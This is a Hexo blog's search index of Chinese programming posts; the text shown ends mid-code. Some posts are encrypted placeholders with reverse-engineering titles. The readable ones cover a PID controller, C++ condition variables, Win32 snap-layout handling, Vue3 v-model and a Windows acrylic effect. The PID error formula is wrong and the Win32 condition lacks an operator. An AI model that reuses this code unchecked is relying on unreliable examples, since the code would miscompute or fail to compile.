<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CEF源码再编译支持MP4格式</title>
      <link href="/d6e1402eafff/"/>
      <url>/d6e1402eafff/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="41a66fcd9f3c362544f4c59ba1279af31790519e75702828a89734fb8a11ebb2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>解决代码自映射后无法调试 &amp; inline hook【Self-Remapping Code】</title>
      <link href="/d53ab2e1b911/"/>
      <url>/d53ab2e1b911/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="f03229dbbd3a3b8ec76ebf9915c01f7736b18bea9904b7eb3991a95954af781f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UE4游戏PAK文件密钥寻找方法</title>
      <link href="/8440ea58d27a/"/>
      <url>/8440ea58d27a/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="62e2fbd7cf32d5857ef0d5ac4f43a515ebc3407bacb4ec9ab2909ec38a32a611"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>虚幻引擎PAK资源包汉化说明二</title>
      <link href="/5b9ba64b4793/"/>
      <url>/5b9ba64b4793/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="a7df17784fe336db7eedb6133f1f021ec17d8694f859c19c89e464b26eb832e5"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UE4 </tag>
            
            <tag> 汉化 </tag>
            
            <tag> 虚幻引擎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PID控制器</title>
      <link href="/4a0302e0ddae/"/>
      <url>/4a0302e0ddae/</url>
      
        <content type="html"><![CDATA[<h2 id="基础解释："><a href="#基础解释：" class="headerlink" title="基础解释："></a><strong>基础解释：</strong></h2><p>P：基础运动量（移动速度）</p><p>I：增幅器（修正误差）</p><p>D：抑制器（阻止超出目标）</p><h2 id="各个参数过大过小情况"><a href="#各个参数过大过小情况" class="headerlink" title="各个参数过大过小情况"></a>各个参数过大过小情况</h2><h3 id="P参数"><a href="#P参数" class="headerlink" title="P参数"></a><strong>P参数</strong></h3><p><strong>过小：</strong>不能达到目标</p><p><strong>过大：</strong>超出目标，表现为抖动或脱离控制</p><h3 id="I参数"><a href="#I参数" class="headerlink" title="I参数"></a>I<strong>参数</strong></h3><p><strong>过小：</strong>不能到目标，小偏差不能回正，还可能出现颤抖现象</p><p><strong>过大：</strong>很容易超出目标，表现为系统迟钝，晃动</p><h3 id="D参数"><a href="#D参数" class="headerlink" title="D参数"></a>D<strong>参数</strong></h3><p><strong>过小：</strong>脱离控制</p><p><strong>过大：</strong>高频抖动，对误差很敏感</p><h2 id="参数调整顺序："><a href="#参数调整顺序：" class="headerlink" title="参数调整顺序："></a><strong>参数调整顺序：</strong></h2><p>根据上述，调整顺序如下：</p><ol><li>调整P</li><li>调整D</li><li>调整I</li></ol><h2 id="C-代码实现"><a href="#C-代码实现" class="headerlink" title="C++代码实现"></a>C++代码实现</h2><p><strong>PidController.h</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PidController</span> <span class="keyword">final</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">PidController</span>(<span class="type">const</span> <span class="type">float</span> kp, <span class="type">const</span> <span class="type">float</span> ki, <span class="type">const</span> <span class="type">float</span> kd);</span><br><span class="line">    ~<span class="built_in">PidController</span>();</span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">CalcExecValue</span><span class="params">(<span class="type">const</span> <span class="type">float</span> value)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Reset</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// kp：比例系数</span></span><br><span class="line">    <span class="type">float</span> m_kp;</span><br><span class="line">    <span class="comment">// ki：积分系数</span></span><br><span class="line">    <span class="type">float</span> m_ki;</span><br><span class="line">    <span class="comment">// kd：微分系数</span></span><br><span class="line">    <span class="type">float</span> m_kd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 偏差</span></span><br><span class="line">    <span class="type">float</span> m_err;</span><br><span class="line">    <span class="comment">// 上一次偏差</span></span><br><span class="line">    <span class="type">float</span> m_lastErr;</span><br><span class="line">    <span class="comment">// 积分</span></span><br><span class="line">    <span class="type">float</span> m_integral;</span><br><span class="line">    <span class="comment">// 微分</span></span><br><span class="line">    <span class="type">float</span> m_differential;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>PidController.cpp</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;PidController.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">PidController::<span class="built_in">PidController</span>(<span class="type">const</span> <span class="type">float</span> kp, <span class="type">const</span> <span class="type">float</span> ki, <span class="type">const</span> <span class="type">float</span> kd)</span><br><span class="line">&#123;</span><br><span class="line">    m_kp = kp;</span><br><span class="line">    m_ki = ki;</span><br><span class="line">    m_kd = kd;</span><br><span class="line">    m_err = <span class="number">0.0f</span>;</span><br><span class="line">    m_lastErr = <span class="number">0.0f</span>;</span><br><span class="line">    m_integral = <span class="number">0.0f</span>;</span><br><span class="line">    m_differential = <span class="number">0.0f</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PidController::~<span class="built_in">PidController</span>() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">PidController::CalcExecValue</span><span class="params">(<span class="type">const</span> <span class="type">float</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 计算偏差</span></span><br><span class="line">    m_err = value - m_err;</span><br><span class="line">    <span class="comment">// 计算积分</span></span><br><span class="line">    m_integral += m_err;</span><br><span class="line">    <span class="comment">// 计算微分</span></span><br><span class="line">    m_differential = m_err - m_lastErr;</span><br><span class="line">    <span class="comment">// 计算执行量</span></span><br><span class="line">    <span class="type">const</span> <span class="type">float</span> output = m_kp * m_err + m_ki * m_integral <span class="comment">/* * time */</span> + m_kd * m_differential; <span class="comment">// / time;</span></span><br><span class="line">    <span class="comment">// 更新上一次偏差</span></span><br><span class="line">    m_lastErr = m_err;</span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PidController::Reset</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    m_err = <span class="number">0.0f</span>;</span><br><span class="line">    m_lastErr = <span class="number">0.0f</span>;</span><br><span class="line">    m_integral = <span class="number">0.0f</span>;</span><br><span class="line">    m_differential = <span class="number">0.0f</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>虚幻引擎PAK资源包汉化说明</title>
      <link href="/d5cb84251fda/"/>
      <url>/d5cb84251fda/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="4e6e80a1bde6285c8785ab00e785463516bf04457d2f327e0b0a68fdbee50cfe"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
            <tag> 虚幻引擎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 条件变量</title>
      <link href="/dbe6f787b885/"/>
      <url>/dbe6f787b885/</url>
      
        <content type="html"><![CDATA[<h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><p>使用 std::condition_variable 的 wait 会把目前的线程 thread 停下来并且<strong>等候事件通知</strong>，而在另一个线程中可以使用 std::condition_variable 的 notify_one 或 notify_all <strong>发送通知那些正在等待的事件</strong></p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">condition_variable 常用成员函数:</span><br><span class="line">- <span class="built_in">wait</span>：阻塞当前线程直到条件变量被唤醒</span><br><span class="line">- notify_one：通知一个正在等待的线程</span><br><span class="line">- notify_all：通知所有正在等待的线程</span><br><span class="line"></span><br><span class="line">使用 <span class="built_in">wait</span> 必须搭配 std::unique_lock&lt;std::mutex&gt; 一起使用</span><br></pre></td></tr></table></figure><h2 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;condition_variable&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::mutex m;</span><br><span class="line">std::condition_variable cv;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">worker_thread</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(m)</span></span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;worker_thread()等待唤醒\n&quot;</span>;</span><br><span class="line">    cv.<span class="built_in">wait</span>(lock);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;worker_thread()已被唤醒\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">std::thread <span class="title">worker</span><span class="params">(worker_thread)</span></span>;</span><br><span class="line"></span><br><span class="line">    std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">5</span>));</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;main()唤醒线程\n&quot;</span>;</span><br><span class="line">    cv.<span class="built_in">notify_one</span>();</span><br><span class="line"></span><br><span class="line">    worker.<span class="built_in">join</span>();</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;main()结束\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程应用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win32 UI拦截贴靠布局方法</title>
      <link href="/1006791080bd/"/>
      <url>/1006791080bd/</url>
      
        <content type="html"><![CDATA[<p>在开发过程中，有一个需求是窗口可以调节大小。但是有最大和最小区间。而Win11有一个贴靠布局功能，这会导致窗口大小突破限制。所以我们需要拦截Win11的贴靠布局。在网上搜索了一番没有找到禁用方式，所以只能用过窗口尺寸改变的时候拦截了，一开始笔者找的是WM_SIZING，但是测试了一下发现贴靠布局不会走这个消息。经过测试此时会走WM_WINDOWPOSCHANGING消息。所以我们将拦截代码写在该消息下即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxxxx::OnWindowPosChanging</span><span class="params">(LPWINDOWPOS lpWndPos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">SetMsgHandled</span>(FALSE);</span><br><span class="line">    <span class="comment">// 判断是否超出最大限度</span></span><br><span class="line">    <span class="keyword">if</span> (lpWndPos-&gt;cx &gt; m_sizeMax.cx  lpWndPos-&gt;cy &gt; m_sizeMax.cy)</span><br><span class="line">    &#123;</span><br><span class="line">        lpWndPos-&gt;cx = m_sizeMax.cx;</span><br><span class="line">        lpWndPos-&gt;cy = m_sizeMax.cy;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断是否允许改变尺寸</span></span><br><span class="line">    <span class="keyword">if</span> (m_isCanResize)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不允许则设置回最大值</span></span><br><span class="line">    lpWndPos-&gt;cx = m_sizeMax.cx;</span><br><span class="line">    lpWndPos-&gt;cy = m_sizeMax.cy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> SOUI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SOUI </tag>
            
            <tag> 贴靠布局 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3父子组件传值双向绑定</title>
      <link href="/8df18e9eee46/"/>
      <url>/8df18e9eee46/</url>
      
        <content type="html"><![CDATA[<blockquote><p>官方链接：<a href="http://www.vueusejs.com/core/useVModel/">useVModel | VueUse中文文档 (vueusejs.com)</a></p></blockquote><h2 id="推荐视频"><a href="#推荐视频" class="headerlink" title="推荐视频"></a>推荐视频</h2><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=359717826&bvid=BV1dX4y1s7FD&cid=1233057702&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;"> </iframe></div><h2 id="简易代码"><a href="#简易代码" class="headerlink" title="简易代码"></a>简易代码</h2><p><strong>注意：</strong>当子组件参数为modelValue时，父组件的v-model后可以不跟modelValue</p><p><strong>父组件：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;app-menu</span><br><span class="line">  ref=&quot;appMenuRef&quot;</span><br><span class="line">  v-model:isShowToolTip=&quot;isShowToolTip&quot;</span><br><span class="line">  :onMenuSelect=&quot;onItemMenuSelect&quot;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><p><strong>子组件：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref, defineProps, defineEmits &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; useVModel &#125; <span class="keyword">from</span> <span class="string">&quot;@vueuse/core&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义宏，用来通知父组件更新值</span></span><br><span class="line"><span class="keyword">const</span> emit = <span class="title function_">defineEmits</span>([<span class="string">&quot;update:isShowToolTip&quot;</span>]);</span><br><span class="line"><span class="comment">// 接收父组件参数</span></span><br><span class="line"><span class="keyword">const</span> props = <span class="title function_">defineProps</span>(&#123;</span><br><span class="line">  <span class="attr">onMenuSelect</span>: <span class="title class_">Function</span>,</span><br><span class="line">  <span class="attr">isShowToolTip</span>: <span class="title class_">Boolean</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 通过useVModel创建一个ref类型的双向绑定变量</span></span><br><span class="line"><span class="keyword">const</span> isShowToolTip = <span class="title function_">useVModel</span>(props, <span class="string">&#x27;isShowToolTip&#x27;</span>,emit);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例用法，下面的赋值会自动请求update:isShowToolTip</span></span><br><span class="line">isShowToolTip.<span class="property">value</span> = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue3 </tag>
            
            <tag> 双向绑定 </tag>
            
            <tag> 数据传递 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows亚克力特效代码实现</title>
      <link href="/0dc8c002e7d7/"/>
      <url>/0dc8c002e7d7/</url>
      
        <content type="html"><![CDATA[<p>防止失效，拷贝一份。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dwmapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个枚举类型，表示不同的窗口组合状态</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">AccentState</span> &#123;</span><br><span class="line">    ACCENT_DISABLED = <span class="number">0</span>,</span><br><span class="line">    ACCENT_ENABLE_GRADIENT = <span class="number">1</span>,</span><br><span class="line">    ACCENT_ENABLE_TRANSPARENTGRADIENT = <span class="number">2</span>,</span><br><span class="line">    ACCENT_ENABLE_BLURBEHIND = <span class="number">3</span>,</span><br><span class="line">    ACCENT_ENABLE_ACRYLICBLURBEHIND = <span class="number">4</span>,</span><br><span class="line">    ACCENT_INVALID_STATE = <span class="number">5</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个结构体，表示窗口组合策略</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">AccentPolicy</span> &#123;</span><br><span class="line">    AccentState AccentState;</span><br><span class="line">    <span class="type">int</span> AccentFlags;</span><br><span class="line">    <span class="type">int</span> GradientColor;</span><br><span class="line">    <span class="type">int</span> AnimationId;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个结构体，表示窗口组合属性</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">WindowCompositionAttributeData</span> &#123;</span><br><span class="line">    <span class="type">int</span> Attribute;</span><br><span class="line">    PVOID Data;</span><br><span class="line">    ULONG DataSize;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数指针类型，用于调用 SetWindowCompositionAttribute API</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI*pSetWindowCompositionAttribute)</span><span class="params">(HWND, WindowCompositionAttributeData*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个全局变量，存储函数指针</span></span><br><span class="line">pSetWindowCompositionAttribute SetWindowCompositionAttribute = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数，用于设置窗口的亚克力效果</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">EnableAcrylic</span><span class="params">(HWND hwnd, COLORREF color)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果函数指针为空，就从 dwmapi.dll 中获取函数地址</span></span><br><span class="line">    <span class="keyword">if</span> (!SetWindowCompositionAttribute) &#123;</span><br><span class="line">        HMODULE hModule = <span class="built_in">LoadLibrary</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;user32.dll&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (hModule) &#123;</span><br><span class="line">            SetWindowCompositionAttribute =</span><br><span class="line">                (pSetWindowCompositionAttribute)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;SetWindowCompositionAttribute&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果函数指针有效，就构造参数并调用函数</span></span><br><span class="line">    <span class="keyword">if</span> (SetWindowCompositionAttribute) &#123;</span><br><span class="line">        AccentPolicy policy = &#123; ACCENT_ENABLE_ACRYLICBLURBEHIND, <span class="number">0</span>, color, <span class="number">0</span> &#125;;</span><br><span class="line">        WindowCompositionAttributeData data = &#123; <span class="number">19</span>, &amp;policy, <span class="built_in">sizeof</span>(AccentPolicy) &#125;;</span><br><span class="line">        <span class="built_in">SetWindowCompositionAttribute</span>(hwnd, &amp;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 